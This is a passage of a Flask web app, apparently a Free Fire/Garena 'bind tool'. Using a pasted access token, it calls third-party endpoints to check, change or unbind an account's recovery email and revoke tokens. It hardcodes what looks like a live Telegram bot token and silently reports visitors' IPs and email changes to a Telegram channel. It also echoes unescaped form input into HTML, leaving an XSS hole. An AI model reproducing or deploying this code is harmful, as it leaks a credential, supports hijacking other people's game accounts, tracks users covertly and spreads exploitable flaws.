from flask import Flask, render_template_string, request, redirect, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os, requests, json, time, random, string

app = Flask(__name__)
app.secret_key = "error_x_secret_2026_" + ''.join(random.choices(string.ascii_letters, k=16))

# ============ DATABASE ============
basedir = os.path.abspath(os.path.dirname(__file__))
db_path = os.path.join(basedir, "error_x.db")
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# ============ CONFIG ============
BOT_TOKEN = "8942532097:AAFWVLTYYgOnp-1aIUdOFYql1bHXhN4sey4"
ACCESS_KEY = "ERROR-X-OWNER"
ADMIN_KEY = "ERROR-X-ADMIN"

# ============ MODELS ============
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    display_id = db.Column(db.Integer, unique=True, nullable=False)
    username = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    device = db.Column(db.String(200))
    battery = db.Column(db.String(20))
    access_token = db.Column(db.String(200))
    joined_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_banned = db.Column(db.Boolean, default=False)

class BannedIP(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(50), unique=True)
    banned_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

# ============ HELPERS ============
def get_next_display_id():
    last = User.query.order_by(User.display_id.desc()).first()
    return last.display_id + 1 if last else 1001

def is_ip_banned(ip):
    return BannedIP.query.filter_by(ip=ip).first() is not None

def send_to_telegram(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
            json={'chat_id': '@Errorzlive', 'text': text, 'parse_mode': 'HTML'}, timeout=5)
    except:
        pass

def is_success(rsp):
    if rsp.status_code != 200:
        return False
    try:
        rj = rsp.json()
        if not rj.get("success"):
            return False
        data = rj.get("data", {})
        if isinstance(data, dict):
            if data.get("error"):
                return False
            g_resp = data.get("garena_response", {})
            if isinstance(g_resp, dict) and g_resp.get("error"):
                return False
        if rj.get("error"):
            return False
        return True
    except:
        return False

def check_bind(at):
    try:
        rsp = requests.get("https://bindinfocrownx612.vercel.app/check", 
            params={'access_token': at}, timeout=15)
        if is_success(rsp):
            d = rsp.json().get("data", {}) or rsp.json()
            return {'status': d.get('status','N/A'), 'current_email': d.get('current_email','N/A'),
                    'pending_email': d.get('pending_email','N/A'), 'email_to_be': d.get('email_to_be','N/A'),
                    'countdown': d.get('countdown_human','N/A')}
        return None
    except:
        return None

# ============ FIXED: send_otp with maximum fallbacks ============
def send_otp(access, email, otp_type="normal"):
    try:
        if otp_type == "current":
            attempts = [
                ("https://chngeforgotcrownx72.vercel.app/otp", {'access_token': access, 'current_email': email}),
                ("https://chngeforgotcrownx72.vercel.app/otp", {'access_token': access, 'email': email}),
                ("https://chngemailcode48.vercel.app/send_otp", {'access_token': access, 'email': email}),
            ]
        elif otp_type == "new":
            attempts = [
                ("https://chngeforgotcrownx72.vercel.app/newotp", {'access_token': access, 'new_email': email}),
                ("https://chngeforgotcrownx72.vercel.app/newotp", {'access_token': access, 'email': email}),
            ]
        elif otp_type == "normal":
            attempts = [
                ("https://chngemailcode48.vercel.app/send_otp", {'access_token': access, 'email': email}),
            ]
        else:
            return False, None
        
        for url, params in attempts:
            try:
                rsp = requests.get(url, params=params, timeout=20)
                if is_success(rsp):
                    return True, rsp.json()
            except:
                continue
        return False, None
    except:
        return False, None

# ============ FIXED: verify_otp with maximum fallbacks ============
def verify_otp(access, email, otp, otp_type="normal"):
    try:
        if otp_type == "current":
            attempts = [
                ("https://chngeforgotcrownx72.vercel.app/verify", {'access_token': access, 'current_email': email, 'otp': otp}),
                ("https://chngeforgotcrownx72.vercel.app/verify", {'access_token': access, 'email': email, 'otp': otp}),
            ]
        elif otp_type == "new":
            attempts = [
                ("https://chngeforgotcrownx72.vercel.app/newverify", {'access_token': access, 'new_email': email, 'otp': otp}),
                ("https://chngeforgotcrownx72.vercel.app/newverify", {'access_token': access, 'email': email, 'otp': otp}),
            ]
        elif otp_type == "normal":
            attempts = [
                ("https://chngemailcode48.vercel.app/verify_otp", {'access_token': access, 'email': email, 'otp': otp}),
            ]
        else:
            return False, None
        
        for url, params in attempts:
            try:
                rsp = requests.get(url, params=params, timeout=20)
                if is_success(rsp):
                    data = rsp.json()
                    verifier = data.get("verifier_token") or data.get("data", {}).get("verifier_token")
                    return True, verifier
            except:
                continue
        return False, None
    except:
        return False, None

def verify_identity(access, sec_code):
    try:
        for params in [{'access_token': access, 'code': sec_code}, {'access_token': access, 'security_code': sec_code}]:
            rsp = requests.get("https://chngemailcode48.vercel.app/verify_identity", params=params, timeout=15)
            if is_success(rsp):
                data = rsp.json()
                identity = data.get("identity_token") or data.get("data", {}).get("identity_token")
                if identity:
                    return True, identity
        return False, None
    except:
        return False, None

def create_rebind(access, email, identity_token, verifier_token):
    try:
        rsp = requests.get("https://chngemailcode48.vercel.app/create_rebind", params={
            'access_token': access, 'email': email, 'identity_token': identity_token, 'verifier_token': verifier_token
        }, timeout=15)
        if is_success(rsp):
            return True, "Email changed successfully!"
        return False, "Failed to change email"
    except:
        return False, "Error"

# ============ FIXED: change_email_no_sec - ab ACTUAL OTPs use hote hain ============
def change_email_no_sec(access, cur_email, new_email, otp1, otp2):
    try:
        # Step 1: Send OTP to current email
        ok1, _ = send_otp(access, cur_email, "current")
        if not ok1:
            return False, "Failed to send OTP to current email"
        time.sleep(1)
        
        # Step 2: Verify OTP - current email (USER KA ACTUAL OTP)
        ok2, identity = verify_otp(access, cur_email, otp1, "current")
        if not ok2 or not identity:
            return False, "Invalid OTP for current email"
        
        # Step 3: Send OTP to new email
        ok3, _ = send_otp(access, new_email, "new")
        if not ok3:
            return False, "Failed to send OTP to new email"
        time.sleep(1)
        
        # Step 4: Verify OTP - new email (USER KA ACTUAL OTP)
        ok4, verifier = verify_otp(access, new_email, otp2, "new")
        if not ok4 or not verifier:
            return False, "Invalid OTP for new email"
        
        # Step 5: Execute change
        rsp = requests.get("https://chngeforgotcrownx72.vercel.app/change", params={
            'access_token': access, 'new_email': new_email, 'identity_token': identity, 'verifier_token': verifier
        }, timeout=15)
        if is_success(rsp):
            return True, "Email changed successfully!"
        return False, "Failed to change email"
    except Exception as e:
        return False, f"Error: {str(e)}"

def unbind_with_sec(access, sec_code):
    try:
        params_list = [
            {'access_token': access, 'security_code': sec_code},
            {'access_token': access, 'code': sec_code},
            {'token': access, 'security_code': sec_code},
        ]
        for params in params_list:
            try:
                rsp = requests.get("https://crownxnewkey10010.vercel.app/securityunbind", params=params, timeout=15)
                if is_success(rsp):
                    return True, "Unbind request created! 15 Days Timer Started."
            except:
                continue
        return False, "Failed to unbind - Invalid security code"
    except:
        return False, "Error"

def unbind_no_sec(access, cur_email, otp):
    try:
        ok1, _ = send_otp(access, cur_email, "current")
        if not ok1:
            return False, "Failed to send OTP to current email"
        time.sleep(1)
        ok2, identity = verify_otp(access, cur_email, otp, "current")
        if not ok2 or not identity:
            return False, "Invalid OTP"
        rsp = requests.get("https://crownxforgotremove23.vercel.app/forgotunbind", 
            params={'access_token': access, 'identity_token': identity}, timeout=15)
        if is_success(rsp):
            return True, "Unbind request created! 15 Days Timer Started."
        return False, "Failed to unbind"
    except:
        return False, "Error"

def revoke_token(access):
    try:
        rsp = requests.get("https://crownxrevoker73.vercel.app/revoke", 
            params={'access_token': access}, timeout=15)
        if is_success(rsp):
            return True, "Token revoked successfully!"
        return False, "Failed to revoke token"
    except:
        return False, "Error"

def cancel_bind(access):
    try:
        rsp = requests.get("https://bindcnclcrownx34.vercel.app/cancelbind", 
            params={'access_token': access}, timeout=15)
        if is_success(rsp):
            return True, "Request cancelled successfully!"
        return False, "Failed to cancel"
    except:
        return False, "Error"


# ============ CSS with background image ============
CSS = """<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
body{min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;position:relative;overflow:auto}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://i.ibb.co/C3rBq6cV/photo-AQADQBBr-Gx-m-GFZ9.jpg');background-size:cover;background-position:center;background-repeat:no-repeat;opacity:0.15;z-index:-1;pointer-events:none}
.card{background:rgba(10,10,10,0.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-radius:30px;padding:40px;max-width:500px;width:100%;border:1px solid #ff000066;box-shadow:0 0 60px rgba(255,0,0,0.1);position:relative;z-index:1}
.card h1{font-size:22px;color:#ff0000;text-align:center;margin-bottom:25px}
.input-group{margin-bottom:18px}
.input-group label{display:block;color:#ff000088;font-size:11px;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}
.input-group input,.input-group select{width:100%;padding:12px 16px;background:rgba(255,0,0,0.04);border:1px solid #ff000033;border-radius:12px;color:#ff6666;font-size:14px;transition:.3s}
.input-group input:focus{outline:none;border-color:#ff0000;box-shadow:0 0 20px rgba(255,0,0,0.1)}
.btn{width:100%;padding:12px;background:linear-gradient(135deg,#ff0000,#cc0000);border:none;border-radius:12px;color:#0a0a0a;font-weight:bold;cursor:pointer;font-size:15px;transition:.3s;letter-spacing:1px}
.btn:hover{transform:translateY(-2px);box-shadow:0 10px 40px rgba(255,0,0,0.3)}
.error{background:rgba(255,0,0,0.15);border:1px solid #ff000066;border-radius:12px;padding:12px;margin-bottom:20px;text-align:center;color:#ff6666;font-size:12px}
.success{background:rgba(0,255,0,0.1);border:1px solid #00ff0066;border-radius:12px;padding:12px;margin-bottom:20px;text-align:center;color:#66ff66;font-size:12px}
.back-link{display:block;text-align:center;margin-top:20px;color:#ff000088;text-decoration:none;font-size:12px;letter-spacing:1px}
.back-link:hover{color:#ff0000}
.logo-text{font-size:32px;background:linear-gradient(135deg,#ff0000,#cc0000);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-align:center;margin-bottom:5px}
.sub-text{color:#ff000088;text-align:center;font-size:12px;margin-bottom:25px;letter-spacing:2px}
</style>"""

# ============ ROUTES ============

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect('/dashboard')
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>ERROR X BIND</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><div style='text-align:center'><div class='logo-text' style='font-weight:900'>ERROR X</div><p class='sub-text'>BIND TOOL</p></div><p class='sub-text'>ENTER ACCESS KEY</p>{{% if error %}}<div class='error'>{{{{ error }}}}</div>{{% endif %}}<form method='POST' action='/login'><div class='input-group'><label>ACCESS KEY</label><input type='password' name='key' placeholder='ENTER ACCESS KEY' required autofocus></div><button type='submit' class='btn'>ACCESS</button></form><div style='text-align:center;margin-top:25px;font-size:10px;color:#ff000044'><a href='https://t.me/Errorzlive' style='color:#ff000088;text-decoration:none'>SUPPORT</a><a href='/admin-login' style='display:block;padding:12px;margin-top:10px;background:rgba(255,0,0,0.08);border:1px solid #ff000044;border-radius:12px;color:#ff000088;text-align:center;text-decoration:none;font-size:13px'>ADMIN PANEL</a><br><br>DEVELOPER - @Errorzlive</div></div></div></body></html>"""

@app.route('/login', methods=['POST'])
def login():
    key = request.form.get('key')
    ip = request.remote_addr
    if is_ip_banned(ip):
        return render_template_string(INDEX_HTML, error="YOU ARE BANNED!")
    if key != ACCESS_KEY:
        return render_template_string(INDEX_HTML, error="INVALID ACCESS KEY!")
    existing = User.query.filter_by(ip=ip).first()
    if existing:
        if existing.is_banned:
            return render_template_string(INDEX_HTML, error="YOU ARE BANNED!")
        session['user_id'] = existing.id
        return redirect('/dashboard')
    did = get_next_display_id()
    u = User(display_id=did, ip=ip, device=request.headers.get('User-Agent','')[:200])
    db.session.add(u)
    db.session.commit()
    session['user_id'] = u.id
    send_to_telegram(f"🔔 NEW LOGIN\nID: {did}\nIP: {ip}")
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/')
    user = User.query.get(session['user_id'])
    if not user or user.is_banned:
        session.clear()
        return redirect('/')
    bind = None
    if user.access_token:
        bind = check_bind(user.access_token)
    
    b_html = ""
    if bind:
        b_html = f"<div class='info-row'><span class='label'>STATUS</span><span class='value'>{bind['status']}</span></div><div class='info-row'><span class='label'>CURRENT EMAIL</span><span class='value'>{bind['current_email']}</span></div><div class='info-row'><span class='label'>PENDING EMAIL</span><span class='value'>{bind['pending_email']}</span></div><div class='info-row'><span class='label'>EMAIL TO BE</span><span class='value'>{bind['email_to_be']}</span></div><div class='info-row'><span class='label'>COUNTDOWN</span><span class='value'>{bind['countdown']}</span></div>"
    else:
        b_html = "<div class='info-row'><span class='label'>Enter Access Token to fetch info:</span></div><form method='POST' action='/set-token' style='margin-top:15px;display:flex;gap:10px'><input type='text' name='access_token' placeholder='Enter Access Token' style='flex:1;padding:12px;background:rgba(255,0,0,0.04);border:1px solid #ff000033;border-radius:12px;color:#ff6666'><button type='submit' style='padding:12px 25px;background:linear-gradient(135deg,#ff0000,#cc0000);border:none;border-radius:12px;color:#0a0a0a;font-weight:bold;cursor:pointer'>FETCH</button></form>"
    
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>ERROR X</title><style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}}
body{{background:#0a0a0a;min-height:100vh;color:#ff6666}}
body::before{{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://i.ibb.co/C3rBq6cV/photo-AQADQBBr-Gx-m-GFZ9.jpg');background-size:cover;background-position:center;opacity:0.06;z-index:-1;pointer-events:none}}
.navbar{{background:rgba(10,10,10,0.95);padding:15px 25px;display:flex;justify-content:space-between;border-bottom:1px solid #ff000033;position:sticky;top:0;z-index:100}}
.navbar h1{{font-size:20px;color:#ff0000}}
.nav-right .id-badge{{color:#ff000088;font-size:11px;border:1px solid #ff000033;padding:4px 14px;border-radius:20px}}
.container{{padding:30px;max-width:900px;margin:0 auto}}
.info-card{{background:rgba(10,10,10,0.92);backdrop-filter:blur(20px);border-radius:20px;padding:25px;border:1px solid #ff000022;margin-bottom:30px}}
.info-card h2{{font-size:16px;color:#ff0000;margin-bottom:15px}}
.info-row{{padding:8px 0;border-bottom:1px solid rgba(255,0,0,0.08);display:flex;justify-content:space-between;font-size:13px}}
.info-row .label{{color:#ff000088}}
.info-row .value{{color:#ff6666;font-weight:bold}}
.btn-red{{padding:12px 25px;background:linear-gradient(135deg,#ff0000,#cc0000);border:none;border-radius:12px;color:#0a0a0a;font-weight:bold;cursor:pointer;text-decoration:none;display:inline-block;text-align:center;font-size:13px;transition:.3s}}
.btn-red:hover{{transform:translateY(-2px);box-shadow:0 10px 40px rgba(255,0,0,0.3)}}
.btn-ghost{{padding:12px 25px;background:transparent;border:1px solid #ff000044;border-radius:12px;color:#ff6666;cursor:pointer;text-decoration:none;display:inline-block;text-align:center;font-size:13px;transition:.3s}}
.btn-ghost:hover{{background:rgba(255,0,0,0.08);border-color:#ff0000}}
.footer{{text-align:center;margin-top:40px;font-size:10px;color:#ff000044;padding:15px}}
</style></head><body>
<div class='navbar'><h1>ERROR X</h1><div class='nav-right'><span class='id-badge'>ID: {user.display_id}</span></div></div>
<div class='container'>
<div class='info-card'><h2>RECOVERY MAIL INFO</h2>{b_html}</div>
<div style='display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px'>
<a href='/check-bind' class='btn-red'>CHECK MAIL</a>
<a href='/change-email-sec' class='btn-red'>CHANGE (SEC)</a>
<a href='/change-email-otp' class='btn-red'>CHANGE (OTP)</a>
<a href='/unbind' class='btn-red'>UNBIND</a>
<a href='/revoke' class='btn-red'>REVOKE</a>
<a href='/cancel-bind' class='btn-red'>CANCEL</a>
</div>
<div style='margin-top:20px;text-align:center'>
<a href='https://t.me/Errorzlive' class='btn-ghost'>TELEGRAM</a>
<a href='/logout' class='btn-ghost' style='margin-left:10px'>LOGOUT</a>
</div>
</div>
<div class='footer'>DEVELOPER - @Errorzlive</div>
</body></html>"""

@app.route('/set-token', methods=['POST'])
def set_token():
    if 'user_id' not in session:
        return redirect('/')
    user = User.query.get(session['user_id'])
    if user:
        user.access_token = request.form.get('access_token')
        db.session.commit()
    return redirect('/dashboard')

@app.route('/check-bind', methods=['GET', 'POST'])
def check_bind_route():
    if 'user_id' not in session:
        return redirect('/')
    err = ""
    bind_data = None
    if request.method == 'POST':
        at = request.form.get('access_token')
        if at:
            bind_data = check_bind(at)
            if not bind_data:
                err = "Failed to fetch bind info!"
        else:
            err = "Access Token required!"
    
    b_html = ""
    if bind_data:
        b_html = f"<div class='success' style='text-align:left'><div><strong>STATUS:</strong> {bind_data['status']}</div><div><strong>CURRENT:</strong> {bind_data['current_email']}</div><div><strong>PENDING:</strong> {bind_data['pending_email']}</div><div><strong>TO BE:</strong> {bind_data['email_to_be']}</div><div><strong>TIMER:</strong> {bind_data['countdown']}</div></div>"
    
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Check Bind</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>CHECK RECOVERY MAIL</h1>{'<div class=error>'+err+'</div>' if err else ''}{b_html}<form method='POST' action='/check-bind'><div class='input-group'><label>ACCESS TOKEN</label><input type='text' name='access_token' placeholder='Enter Access Token' required></div><button type='submit' class='btn'>CHECK</button></form><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""

# ============ FIXED: Change Email With SEC ============
@app.route('/change-email-sec', methods=['GET', 'POST'])
def change_email_sec_route():
    if 'user_id' not in session:
        return redirect('/')
    err = ""
    if request.method == 'POST':
        access = request.form.get('access_token')
        current_email = request.form.get('current_email')
        sec_code = request.form.get('sec_code')
        new_email = request.form.get('new_email')
        if not all([access, current_email, sec_code, new_email]):
            err = "All fields required!"
        else:
            success, identity = verify_identity(access, sec_code)
            if not success:
                err = "Invalid Security Code!"
            else:
                ok, _ = send_otp(access, new_email, "new")
                if not ok:
                    err = "Failed to send OTP to new email!"
                else:
                    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Verify OTP</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>VERIFY OTP FOR NEW EMAIL</h1><p style='color:#ff000088;text-align:center;font-size:13px;margin-bottom:20px'>OTP sent to {new_email}</p><form method='POST' action='/change-email-sec-otp'><div class='input-group'><label>OTP CODE (NEW EMAIL)</label><input type='text' name='otp_new' placeholder='Enter OTP from New Email' required></div><button type='submit' class='btn'>VERIFY & CHANGE</button><input type='hidden' name='access_token' value='{access}'><input type='hidden' name='current_email' value='{current_email}'><input type='hidden' name='new_email' value='{new_email}'><input type='hidden' name='sec_code' value='{sec_code}'></form><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
    
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Change Email</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>CHANGE MAIL (WITH SECURITY CODE)</h1>{'<div class=error>'+err+'</div>' if err else ''}<form method='POST' action='/change-email-sec'><div class='input-group'><label>ACCESS TOKEN</label><input type='text' name='access_token' placeholder='Enter Access Token' required></div><div class='input-group'><label>CURRENT BIND EMAIL</label><input type='email' name='current_email' placeholder='Enter Current Bound Email' required></div><div class='input-group'><label>SECURITY CODE</label><input type='text' name='sec_code' placeholder='Enter Security Code' required></div><div class='input-group'><label>NEW EMAIL</label><input type='email' name='new_email' placeholder='Enter New Email' required></div><button type='submit' class='btn'>SEND OTP TO NEW EMAIL</button></form><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""

@app.route('/change-email-sec-otp', methods=['POST'])
def change_email_sec_otp_route():
    if 'user_id' not in session:
        return redirect('/')
    access = request.form.get('access_token')
    new_email = request.form.get('new_email')
    sec_code = request.form.get('sec_code')
    otp_new = request.form.get('otp_new')
    if not all([access, new_email, otp_new]):
        return redirect('/change-email-sec')
    
    success, verifier = verify_otp(access, new_email, otp_new, "new")
    if not success:
        return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Error</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>VERIFY OTP</h1><div class='error'>Invalid OTP for new email!</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
    
    ok, identity = verify_identity(access, sec_code)
    if not ok:
        return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Error</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>VERIFY OTP</h1><div class='error'>Security code verification failed!</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
    
    done, msg = create_rebind(access, new_email, identity, verifier)
    if done:
        send_to_telegram(f"✅ EMAIL CHANGED (SEC)\nNew Email: {new_email}")
        return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Success</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>SUCCESS</h1><div class='success'>Email changed to {new_email}!</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Error</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>ERROR</h1><div class='error'>{msg}</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""

# ============ FIXED: Change Email With OTP ============
@app.route('/change-email-otp', methods=['GET', 'POST'])
def change_email_otp_route():
    if 'user_id' not in session:
        return redirect('/')
    
    if request.method == 'POST':
        step = int(request.form.get('step', 1))
        
        # STEP 1: Send OTP to current email
        if step == 1:
            access = request.form.get('access_token')
            cur = request.form.get('current_email')
            if not access or not cur:
                return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Change Email</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>CHANGE MAIL (WITH OTP)</h1><div class='error'>Access Token and Current Email required!</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
            
            ok, resp = send_otp(access, cur, "current")
            if not ok:
                return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Change Email</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>CHANGE MAIL (WITH OTP)</h1><div class='error'>FAILED TO SEND OTP TO CURRENT EMAIL!<br><span style='font-size:10px;color:#ff000066'>Try again or use different access token</span></div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
            
            return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Step 2</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>CHANGE MAIL (WITH OTP)</h1><div style='text-align:center;color:#ff000066;font-size:11px;margin-bottom:20px'>STEP 2 OF 3 - VERIFY CURRENT EMAIL</div><p style='color:#00ff0088;text-align:center;font-size:12px;margin-bottom:20px'>✓ OTP sent to your current email!</p><form method='POST' action='/change-email-otp'><div class='input-group'><label>OTP CODE (CURRENT EMAIL)</label><input type='text' name='otp1' placeholder='Enter OTP from Current Email' required></div><div class='input-group'><label>NEW EMAIL</label><input type='email' name='new_email' placeholder='Enter New Email' required></div><button type='submit' class='btn'>VERIFY & SEND OTP TO NEW EMAIL</button><input type='hidden' name='step' value='2'><input type='hidden' name='access_token' value='{access}'><input type='hidden' name='current_email' value='{cur}'></form><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
        
        # STEP 2: Verify current email OTP, send OTP to new email
        elif step == 2:
            access = request.form.get('access_token')
            cur = request.form.get('current_email')
            otp1 = request.form.get('otp1')
            new = request.form.get('new_email')
            
            if not all([access, cur, otp1, new]):
                return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Error</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>ERROR</h1><div class='error'>All fields required!</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
            
            # Verify current email OTP
            ok2, identity = verify_otp(access, cur, otp1, "current")
            if not ok2:
                return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Error</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>ERROR</h1><div class='error'>INVALID OTP FOR CURRENT EMAIL!<br><span style='font-size:10px;color:#ff000066'>Check OTP and try again</span></div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
            
            # Send OTP to new email
            ok3, _ = send_otp(access, new, "new")
            if not ok3:
                return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Error</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>ERROR</h1><div class='error'>Failed to send OTP to new email!</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
            
            return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Step 3</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>CHANGE MAIL (WITH OTP)</h1><div style='text-align:center;color:#ff000066;font-size:11px;margin-bottom:20px'>STEP 3 OF 3 - VERIFY NEW EMAIL</div><p style='color:#00ff0088;text-align:center;font-size:12px;margin-bottom:20px'>✓ OTP sent to {new}</p><form method='POST' action='/change-email-otp'><div class='input-group'><label>OTP CODE (NEW EMAIL)</label><input type='text' name='otp2' placeholder='Enter OTP from New Email' required></div><button type='submit' class='btn'>CONFIRM & CHANGE</button><input type='hidden' name='step' value='3'><input type='hidden' name='access_token' value='{access}'><input type='hidden' name='current_email' value='{cur}'><input type='hidden' name='new_email' value='{new}'><input type='hidden' name='otp1' value='{otp1}'></form><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
        
        # STEP 3: Verify new email OTP and execute change - FIXED: actual OTPs use hote hain
        elif step == 3:
            access = request.form.get('access_token')
            cur = request.form.get('current_email')
            new = request.form.get('new_email')
            otp2 = request.form.get('otp2')
            otp1 = request.form.get('otp1')
            
            if not all([access, cur, new, otp2, otp1]):
                return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Error</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>ERROR</h1><div class='error'>All fields required!</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
            
            # FIXED: Actual OTPs (otp1, otp2) pass ho rahe hain, hardcoded nahi!
            success, msg = change_email_no_sec(access, cur, new, otp1, otp2)
            if success:
                send_to_telegram(f"✅ EMAIL CHANGED (OTP)\nFrom: {cur}\nTo: {new}")
                return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Success</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>SUCCESS</h1><div class='success'>{msg}</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
            else:
                return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Error</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>ERROR</h1><div class='error'>{msg}</div><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""
    
    # GET request - Step 1 form
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Change Email</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>CHANGE MAIL (WITH OTP)</h1><div style='text-align:center;color:#ff000066;font-size:11px;margin-bottom:20px'>STEP 1 OF 3</div><form method='POST' action='/change-email-otp'><div class='input-group'><label>ACCESS TOKEN</label><input type='text' name='access_token' placeholder='Enter Access Token' required></div><div class='input-group'><label>CURRENT BIND EMAIL</label><input type='email' name='current_email' placeholder='Enter Current Bound Email' required></div><button type='submit' class='btn'>SEND OTP TO CURRENT EMAIL</button><input type='hidden' name='step' value='1'></form><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""

# ============ FIXED: Unbind ============
@app.route('/unbind', methods=['GET', 'POST'])
def unbind_route():
    if 'user_id' not in session:
        return redirect('/')
    err = ""
    success_msg = ""
    if request.method == 'POST':
        access = request.form.get('access_token')
        sec_code = request.form.get('sec_code')
        cur_email = request.form.get('current_email')
        otp = request.form.get('otp')
        method = request.form.get('method', 'sec')
        
        if not access:
            err = "Access Token required!"
        elif method == 'sec' and sec_code:
            ok, msg = unbind_with_sec(access, sec_code)
            if ok:
                success_msg = msg
